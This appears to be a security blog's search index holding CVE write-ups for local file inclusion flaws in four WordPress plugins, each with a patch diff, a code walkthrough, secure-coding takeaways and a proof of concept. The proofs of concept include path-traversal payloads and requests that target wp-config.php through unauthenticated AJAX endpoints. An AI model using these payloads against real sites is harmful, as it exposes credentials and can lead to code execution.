Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rVulnerable code: public static function renderElementorLayout(string $layout, array $data, array $settings): void { $styleTypeKey = \"{$layout}_style_type\"; $styleType = stripslashes($settings[$styleTypeKey]); $path = stripslashes(TM_PATH . '/public/templates/elementor/layouts/' . $layout . '/'); $templateName = sanitize_file_name( $styleType . '.php' ); //allowed file type $allowedFileTypes = [ 'php' ]; $ext = pathinfo($path . $templateName, PATHINFO_EXTENSION); if (in_array($ext, $allowedFileTypes)) { if (file_exists($path . $templateName)) { include self::locateTemplate($templateName, '', $path); } } } private static function locateTemplate(string $templateName, string $templatePath = '', string $defaultPath = ''): string { $templatePath = $templatePath ?: 'public/templates'; $defaultPath = $defaultPath ?: TM_PATH . '/public/templates/'; $template = locate_template(trailingslashit($templatePath) . $templateName); return $template ?: \"{$defaultPath}{$templateName}\"; } In the vulnerable version, renderElementorLayout() does not validate input values. An attacker can bypass the logic if they control $layout and $settings, for example: In renderElementorLayout(): $layout = \"../../../../../../..\" $settings['../../../../../../.._style_type'] = \"wp-config\" Then: $styleType = 'wp-config' $path = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../' $templateName = wp-config.php $path . $templateName = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../wp-config.php' Debugger values of variables After passing the if checks, the code includes the return value of locateTemplate(wp-config.php, '', TM_PATH . '/public/templates/elementor/layouts/../../../../../../../'): private static function locateTemplate(string $templateName, string $templatePath = '', string $defaultPath = ''): string { $templatePath = $templatePath ?: 'public/templates'; $defaultPath = $defaultPath ?: TM_PATH . '/public/templates/'; $template = locate_template(trailingslashit($templatePath) . $templateName); return $template ?: \"{$defaultPath}{$templateName}\"; } At this point: $templatePath = public/templates $defaultPath = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../' $locate_template = locate_template('public/templates/wp-config.php') = \"\" — locate_template() returns the absolute path if found, otherwise returns an empty string \"\". When $locate_template is empty, it returns TM_PATH . '/public/templates/elementor/layouts/../../../../../../../wp-config.php' to include. Patched code: public static function renderElementorLayout(string $layout, array $data, array $settings): void { $allowedLayouts = ['grid', 'list', 'slider', 'table', 'isotope']; // Allowed layouts if (!in_array($layout, $allowedLayouts, true)) { wp_die(__('Invalid layout.', 'wp-team-manager')); } $styleTypeKey = \"{$layout}_style_type\"; $styleType = $settings[$styleTypeKey] ?? ''; // Ensure only safe characters (alphanumeric + underscores) if (!preg_match('/^[a-zA-Z0-9_-]+$/', $styleType)) { wp_die(__('Invalid style type.', 'wp-team-manager')); } // Ensure constants exist before using them if (!defined('TM_PATH')) { wp_die(__('TM_PATH is not defined.', 'wp-team-manager')); } // Define Free path (always available) $basePath = realpath(TM_PATH . '/public/templates/elementor/layouts/'); // Define Pro path if available $proPath = defined('TM_PRO_PATH') ? realpath(TM_PRO_PATH . '/public/templates/elementor/layouts/') : null; // Ensure the free path is valid if (!$basePath) { wp_die(__('Invalid base template path.', 'wp-team-manager')); } $templateName = sanitize_file_name($styleType . '.php'); // Define possible template paths (Pro first, then Free) $proFullPath = $proPath ? $proPath . '/' . $layout . '/' . $templateName : null; $freeFullPath = $basePath . '/' . $layout . '/' . $templateName; // Check if Pro template exists and is readable if ($proFullPath \u0026\u0026 is_readable($proFullPath) \u0026\u0026 strpos(realpath($proFullPath), $proPath) === 0) { in","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rInfo\rThe word Elementor in the function name renderElementorLayout() refers to the Elementor plugin in WordPress, used to build post content. When editing a post that contains this Team Manager widget or when opening a saved post, renderElementorLayout() will be invoked. Plugin element in Elementor Capture the edit request with BurpSuite: Key settings in the request We observe a settings key containing layout_type and {layout_type_value}_style_type keys corresponding to the analyzed code: $styleTypeKey = \"{$layout}_style_type\"; $styleType = stripslashes($settings[$styleTypeKey]); 👉 These values are controllable. ","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rCreate a new team at endpoint: wp-admin/post-new.php?post_type=team_manager because a new team provides values to add to the Team Manager widget layout. Step 2\rCreate a post using Elementor and add the Team Manager widget. Add the Team Manager widget to a post Step 3\rSubmit, capture the request with BurpSuite and send it to Repeater Step 4\rModify the action parameter’s value in the request using the Inspector and resend the payload Result: The debugger jumped to wp-config.php Successful LFI result ","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rCreate a new team at endpoint: wp-admin/post-new.php?post_type=team_manager because a new team provides values to add to the Team Manager widget layout. Step 2\rCreate a post using Elementor and add the Team Manager widget. Add the Team Manager widget to a post Step 3\rSubmit, capture the request with BurpSuite and send it to Repeater Step 4\rModify the action parameter’s value in the request using the Inspector and resend the payload Result: The debugger jumped to wp-config.php Successful LFI result ","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#step-1"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rCreate a new team at endpoint: wp-admin/post-new.php?post_type=team_manager because a new team provides values to add to the Team Manager widget layout. Step 2\rCreate a post using Elementor and add the Team Manager widget. Add the Team Manager widget to a post Step 3\rSubmit, capture the request with BurpSuite and send it to Repeater Step 4\rModify the action parameter’s value in the request using the Inspector and resend the payload Result: The debugger jumped to wp-config.php Successful LFI result ","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#step-2"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rCreate a new team at endpoint: wp-admin/post-new.php?post_type=team_manager because a new team provides values to add to the Team Manager widget layout. Step 2\rCreate a post using Elementor and add the Team Manager widget. Add the Team Manager widget to a post Step 3\rSubmit, capture the request with BurpSuite and send it to Repeater Step 4\rModify the action parameter’s value in the request using the Inspector and resend the payload Result: The debugger jumped to wp-config.php Successful LFI result ","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#step-3"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rCreate a new team at endpoint: wp-admin/post-new.php?post_type=team_manager because a new team provides values to add to the Team Manager widget layout. Step 2\rCreate a post using Elementor and add the Team Manager widget. Add the Team Manager widget to a post Step 3\rSubmit, capture the request with BurpSuite and send it to Repeater Step 4\rModify the action parameter’s value in the request using the Inspector and resend the payload Result: The debugger jumped to wp-config.php Successful LFI result ","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#step-4"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rCVE-2025-30868 is an LFI in Team Manager ≤2.1.23: renderElementorLayout() fails to validate $layout/$settings, allowing path traversal and include() of arbitrary files. Patched in v2.2.0 using whitelist, regex checks, and realpath() verification. ","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rDo not use raw input to build include paths. Use a whitelist for layouts/templates. Sanitize filenames + use realpath() + is_readable() before including. For public endpoints: enforce server-side input controls — nonce alone is not sufficient. ","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rFile Inclusion/Path traversal — Hacktrick WordPress Team Manager Plugin \u003c= 2.1.23 is vulnerable to Local File Inclusion ","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Motors Plugin.","date":"2025-10-14","objectID":"/posts/2025-10-14-cve-2025-32654/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/posts/2025-10-14-cve-2025-32654/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe Motors plugin, version ≤ 1.4.71, contains a Local File Inclusion (LFI) vulnerability that allows an unauthenticated attacker to control a file parameter in an include/require statement, thereby injecting or reading local files on the server (e.g., configuration files containing credentials). This can lead to sensitive information disclosure, and under certain configurations, remote code execution. CVE ID: CVE-2025-32654 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.4.71 Patched Versions: 1.4.72 CVSS Severity: High (8.1) Required Privilege: Unauthenticated Product: WordPress Motors Plugin ","date":"2025-10-14","objectID":"/posts/2025-10-14-cve-2025-32654/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/posts/2025-10-14-cve-2025-32654/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions – Motors: 1.4.71 (vulnerable) and 1.4.72 (patched). Diff tool – Meld or any other comparison (diff) tool to inspect and compare differences between two versions. ","date":"2025-10-14","objectID":"/posts/2025-10-14-cve-2025-32654/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/posts/2025-10-14-cve-2025-32654/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-14","objectID":"/posts/2025-10-14-cve-2025-32654/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/posts/2025-10-14-cve-2025-32654/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rVulnerable version: public static function motors_ew_grid_tabs() { $template = sanitize_text_field( $_POST['template'] ); // other logic } The vulnerable code only sanitizes HTML characters using sanitize_text_field(), without restricting paths — thus an attacker can inject ../ or any filename, leading to LFI. Patched version: public static function motors_ew_grid_tabs() { $allowed_templates = array( 'listing-cars/listing-grid-directory-loop-4', 'listing-cars/listing-grid-directory-loop-3', 'listing-cars/listing-grid-directory-loop', ); $template = 'listing-cars/' . ( isset( $_POST['template'] ) ? sanitize_file_name( $_POST['template'] ) : '' ); if ( ! in_array( $template, $allowed_templates, true ) ) { wp_send_json_error( 'Invalid template' ); return; } // other logic } The patch applies sanitize_file_name() along with a whitelist to validate input, effectively neutralizing any possible exploitation through the template parameter. ","date":"2025-10-14","objectID":"/posts/2025-10-14-cve-2025-32654/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/posts/2025-10-14-cve-2025-32654/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rThe function motors_ew_grid_tabs() is registered as a callback for the action hook \"grid_tabs_widget\" via: add_action( 'wp_ajax_nopriv_grid_tabs_widget', array( self::class, 'motors_ew_grid_tabs' ) ); The prefix wp_ajax_nopriv_ indicates that this action does not require user authentication to trigger the AJAX endpoint. Therefore, the endpoint can be publicly accessed through: /wp-admin/admin-ajax.php?action=grid_tabs_widget When invoked, motors_ew_grid_tabs() is executed: public static function motors_ew_grid_tabs() { check_ajax_referer( 'motors_grid_tabs', 'security' ); $listing_types = apply_filters( 'stm_listings_post_type', 'listings' ); $tab_type = sanitize_text_field( $_POST['tab_type'] ); $per_page = intval( $_POST['per_page'] ); $template = sanitize_text_field( $_POST['template'] ); $img_size = sanitize_text_field( $_POST['img_size'] ); $args = array( 'post_type' =\u003e $listing_types, 'post_status' =\u003e 'publish', 'posts_per_page' =\u003e $per_page, ); if ( 'popular' === $tab_type ) { $args = array_merge( $args, array( 'orderby' =\u003e 'meta_value_num', 'meta_key' =\u003e 'stm_car_views', 'order' =\u003e 'DESC', ) ); } $args['meta_query'][] = array( 'key' =\u003e 'car_mark_as_sold', 'value' =\u003e '', 'compare' =\u003e '=', ); $template_args = array(); if ( ! empty( $img_size ) ) { $template_args = array( 'custom_img_size' =\u003e $img_size, ); } $listings_query = new WP_Query( $args ); if ( $listings_query-\u003ehave_posts() ) { $output = ''; ob_start(); while ( $listings_query-\u003ehave_posts() ) { $listings_query-\u003ethe_post(); do_action( 'stm_listings_load_template', $template, $template_args ); } $output .= ob_get_clean(); } wp_send_json( array( 'html' =\u003e $output, ) ); } At the beginning of motors_ew_grid_tabs(), this line: check_ajax_referer( 'motors_grid_tabs', 'security' ); performs a nonce validation to protect against CSRF (Cross-Site Request Forgery). If the nonce provided by the client is invalid or missing, the function halts further AJAX processing — meaning all subsequent logic (handling $template, post query, and HTML rendering) will not execute. public static function motors_create_nonce() { $grid_tabs_widget = wp_create_nonce( 'motors_grid_tabs' ); // other logic wp_localize_script( 'jquery', 'mew_nonces', array( 'motors_grid_tabs' =\u003e $grid_tabs_widget, // other logic ) ); } The function motors_create_nonce() generates the nonce for 'motors_grid_tabs' using wp_create_nonce() and exposes it to JavaScript via wp_localize_script() under the variable mew_nonces.motors_grid_tabs. Tip Because this vulnerability is unauthenticated, the nonce is not visible in the admin area. Instead, after installing the plugin with all dependencies, open the homepage, then search the page source for the keyword motors_grid_tabs to find the required nonce value. Nonce value shown in browser source Additionally, the homepage source contains a JavaScript snippet that automatically triggers the AJAX call to the endpoint in focus: /wp-admin/admin-ajax.php?action=grid_tabs_widget when the page loads: \u003cscript\u003e (function($) { $(document).ready(function() { $.ajax({ type: \"POST\", url: ajaxurl, dataType: 'json', async: true, data: 'action=grid_tabs_widget\u0026tab_type=popular\u0026per_page=8\u0026template=listing-cars/listing-grid-directory-loop-4\u0026img_size=\u0026security=' + mew_nonces.motors_grid_tabs, success: function(data) { if( data.hasOwnProperty('html') ) $('#popular-tab-content').html(data.html); updateGridItemTitles(); }, }); }); })(jQuery) \u003c/script\u003e This script executes automatically because it’s inside $(document).ready(), so jQuery runs it when the page finishes loading. Leveraging this, we can reload the homepage and intercept the AJAX request using BurpSuite to capture the required parameters. POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 Accept: application/json, text/javascript, */*; q=0.01 ... action=grid_tabs_widget\u0026tab_type=popular\u0026per_page=8\u0026template=listing-cars/listing-grid-di","date":"2025-10-14","objectID":"/posts/2025-10-14-cve-2025-32654/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/posts/2025-10-14-cve-2025-32654/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-14","objectID":"/posts/2025-10-14-cve-2025-32654/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/posts/2025-10-14-cve-2025-32654/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rAdd a simple test code to wp-config.php: \u003c?php echo \"payload\" Send a POST request containing the LFI payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... action=grid_tabs_widget\u0026tab_type=popular\u0026per_page=8\u0026template=/partials/../../../../../payload\u0026img_size=\u0026security=d15dd83890 Result: Successful LFI result ","date":"2025-10-14","objectID":"/posts/2025-10-14-cve-2025-32654/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/posts/2025-10-14-cve-2025-32654/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rCVE-2025-32654 is an LFI vulnerability in Motors ≤ 1.4.71, caused by an unsanitized template parameter that allows path traversal and arbitrary include() calls. The public endpoint (wp_ajax_nopriv_) and nonce exposed in the front-end make it easily exploitable. It was patched in v1.4.72 by normalizing file names and validating them against a whitelist. ","date":"2025-10-14","objectID":"/posts/2025-10-14-cve-2025-32654/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/posts/2025-10-14-cve-2025-32654/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rNever use raw user input to construct file paths for include. Always enforce a whitelist of valid templates/paths. Normalize (e.g. sanitize_file_name()/sanitize_key()), and use realpath() to ensure paths remain within the intended directory. For public endpoints, strictly validate inputs — don’t rely solely on nonce protection. ","date":"2025-10-14","objectID":"/posts/2025-10-14-cve-2025-32654/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/posts/2025-10-14-cve-2025-32654/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rFile Inclusion/Path traversal — HackTricks WordPress Motors Plugin \u003c= 1.4.71 is vulnerable to Local File Inclusion ","date":"2025-10-14","objectID":"/posts/2025-10-14-cve-2025-32654/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/posts/2025-10-14-cve-2025-32654/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Geo Mashup Plugin.","date":"2025-10-13","objectID":"/posts/2025-10-13-cve-2025-48293/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/posts/2025-10-13-cve-2025-48293/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe Geo Mashup plugin version ≤ 1.13.16 contains a Local File Inclusion vulnerability that allows an unauthenticated attacker to control the file parameter used in include/require, thereby injecting or reading local files on the server (for example configuration files containing credentials), leading to leakage of sensitive information and, in some configurations, potential code execution. CVE ID: CVE-2025-48293 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.13.16 Patched Versions: 1.13.17 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Geo Mashup Plugin ","date":"2025-10-13","objectID":"/posts/2025-10-13-cve-2025-48293/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/posts/2025-10-13-cve-2025-48293/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Geo Mashup: 1.13.16 (vulnerable) and 1.13.17 (patched). Diff tool - Meld or any diff/comparison tool to inspect differences between the two versions. ","date":"2025-10-13","objectID":"/posts/2025-10-13-cve-2025-48293/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/posts/2025-10-13-cve-2025-48293/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-13","objectID":"/posts/2025-10-13-cve-2025-48293/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/posts/2025-10-13-cve-2025-48293/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rVulnerable code: public static function generate_object_html( ) { $template_base = ( isset( $_GET['template'] ) ) ? $_GET['template'] : ''; // other logc load_template( GeoMashup::locate_template( $template_base ) ); } $template_base is taken directly from $_GET['template'] without any checks/sanitization. The value is passed to GeoMashup::locate_template() and then used with load_template() — an attacker can control the file path to be included. Patch: public static function generate_object_html( ) { $template_base = ( isset( $_GET['template'] ) ) ? sanitize_key($_GET['template']) : ''; // other logic load_template( GeoMashup::locate_template( $template_base ) ); } sanitize_key() is applied to template =\u003e removes unsafe characters, prevents ../, \\, and special characters, reducing the risk of path traversal and LFI from the template parameter. ","date":"2025-10-13","objectID":"/posts/2025-10-13-cve-2025-48293/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/posts/2025-10-13-cve-2025-48293/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rWe analyze the logic in GeoMashup::locate_template() to see how it affects $template_base public static function locate_template( $template_base ) { $template = locate_template( array(\"geo-mashup-$template_base.php\") ); if ( empty( $template ) || !is_readable( $template ) ) { $template = path_join( GEO_MASHUP_DIR_PATH, \"default-templates/$template_base.php\" ); } return $template; } $template is reassigned by calling locate_template() (from template.php) with the argument geo-mashup-$template_base.php function locate_template( $template_names, $load = false, $load_once = true, $args = array() ) { global $wp_stylesheet_path, $wp_template_path; if ( ! isset( $wp_stylesheet_path ) || ! isset( $wp_template_path ) ) { wp_set_template_globals(); } $is_child_theme = is_child_theme(); $located = ''; foreach ( (array) $template_names as $template_name ) { if ( ! $template_name ) { continue; } if ( file_exists( $wp_stylesheet_path . '/' . $template_name ) ) { $located = $wp_stylesheet_path . '/' . $template_name; break; } elseif ( $is_child_theme \u0026\u0026 file_exists( $wp_template_path . '/' . $template_name ) ) { $located = $wp_template_path . '/' . $template_name; break; } elseif ( file_exists( ABSPATH . WPINC . '/theme-compat/' . $template_name ) ) { $located = ABSPATH . WPINC . '/theme-compat/' . $template_name; break; } } if ( $load \u0026\u0026 '' !== $located ) { load_template( $located, $load_once, $args ); } return $located; } The logic checks for the existence of files when concatenated with $template_name; if none exist it returns an empty string ''. File existence related logic When an attacker sends $_GET['template'] containing ../ the file will by default not exist, and locate_template() returns ''. Returning to GeoMashup::locate_template(), when $template is empty and not readable (!is_readable($template)) it is reassigned and returned. const string GEO_MASHUP_DIR_PATH = \"/srv/www/wordpress/wp-content/plugins/geo-mashup\" GEO_MASHUP_DIR_PATH.default-templates/$template_base.php 👉 GeoMashup::locate_template() does not modify $template_base which we control, so we proceed to find a way to trigger this behavior. if ( ( isset( $_GET['output'] ) and 'json' == $_GET['output'] ) or empty( $_GET['object_ids'] ) ) { GeoMashupQuery::generate_location_json( ); } else { GeoMashupQuery::generate_object_html( ); } generate_object_html() is only called when $_GET['output'] is not provided and $_GET['object_ids'] is not empty. geo-query.php containing the above logic is invoked in geo-mashup.php geo-query.php is called within geo-mashup.php The geo_query function is the callback for an Unauthenticated action hook: add_action( 'wp_ajax_nopriv_geo_mashup_query', array( __CLASS__, 'geo_query') ); When accessing the endpoint /wp-admin/admin-ajax.php with action=geo_mashup_query the geo_query callback is executed. ","date":"2025-10-13","objectID":"/posts/2025-10-13-cve-2025-48293/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/posts/2025-10-13-cve-2025-48293/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-13","objectID":"/posts/2025-10-13-cve-2025-48293/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/posts/2025-10-13-cve-2025-48293/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rAdd code to wp-config.php for testing echo \"Payload\"; Send a GET request with an LFI payload GET /wp-admin/admin-ajax.php?action=geo_mashup_query\u0026object_ids=2\u0026template=../../../../wp-config HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: vi,en-US;q=0.7,en;q=0.3 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: green Priority: u=0, i Result: Successful LFI result ","date":"2025-10-13","objectID":"/posts/2025-10-13-cve-2025-48293/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/posts/2025-10-13-cve-2025-48293/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rCVE-2025-48293 is an LFI caused by using the template input without validation when concatenating into a fallback path, allowing path traversal (..) and inclusion of unintended files. It was fixed in v1.13.17 by applying sanitize_key(). ","date":"2025-10-13","objectID":"/posts/2025-10-13-cve-2025-48293/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/posts/2025-10-13-cve-2025-48293/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rDo not use user input directly to build paths for includes. Use a whitelist or sanitize_key() + realpath() checks. ","date":"2025-10-13","objectID":"/posts/2025-10-13-cve-2025-48293/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/posts/2025-10-13-cve-2025-48293/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rFile Inclusion/Path traversal — Hacktrick WordPress Geo Mashup Plugin \u003c= 1.13.16 is vulnerable to Local File Inclusion ","date":"2025-10-13","objectID":"/posts/2025-10-13-cve-2025-48293/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/posts/2025-10-13-cve-2025-48293/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage Plugin.","date":"2025-10-12","objectID":"/posts/2025-10-12-cve-2025-53328/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/posts/2025-10-12-cve-2025-53328/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage version ≤ 19.11.0 contains a Local File Inclusion (CVE-2025-53328, CVSS 7.5) vulnerability that allows an unauthenticated attacker to control the file parameter in an include/require call, enabling inclusion or reading of local files on the server (e.g., configuration files containing credentials), leading to disclosure of sensitive information and, in some configurations, potential code execution. CVE ID: CVE-2025-53328 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 19.11.0 Patched Versions: 19.11.1 CVSS severity: High (7.5) Required Privilege: Unauthenticated Product: WordPress Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage Plugin Important Although the vulnerability is published as Unauthenticated, in many deployments exploitation practically requires minimal internal privileges — for example a Contributor account or equivalent in WordPress. ","date":"2025-10-12","objectID":"/posts/2025-10-12-cve-2025-53328/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/posts/2025-10-12-cve-2025-53328/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Poll, Survey \u0026 Quiz Maker Plugin by Opinion Stage: 19.11.0 (vulnerable) and 19.11.1 (patched). Diff tool - Meld or any diff tool to compare differences between versions. ","date":"2025-10-12","objectID":"/posts/2025-10-12-cve-2025-53328/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/posts/2025-10-12-cve-2025-53328/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-12","objectID":"/posts/2025-10-12-cve-2025-53328/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/posts/2025-10-12-cve-2025-53328/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rVulnerable version: private static function prepare_view_file_name_form_current_page() { $view_file_name = ''; if ( !empty( $_REQUEST['page'] ) ) { $qry_str_check_os = sanitize_text_field( $_REQUEST['page'] ); $qry_str_check_os = explode( '-', $qry_str_check_os ); if ( 'opinionstage' === $qry_str_check_os[0] ) { $view_file_name = str_replace( 'opinionstage-', '', sanitize_text_field( $_REQUEST['page'] ) ); $view_file_name = str_replace( '-', '_', $view_file_name ); } } return $view_file_name; } In the vulnerable version, the page parameter is taken from $_REQUEST and controlled by the user but the file name is not properly validated → allowing Local File Inclusion. The function only uses sanitize_text_field and checks the opinionstage- prefix, then removes the prefix and replaces - with _, so an attacker can supply: ?page=opinionstage-../../wp-config Patched version: private static function prepare_view_file_name_from_current_page() { if (empty($_REQUEST['page']) || !is_string($_REQUEST['page'])) { return ''; } $page = sanitize_text_field($_REQUEST['page']); if (substr($page, 0, strlen('opinionstage-')) !== 'opinionstage-') { return 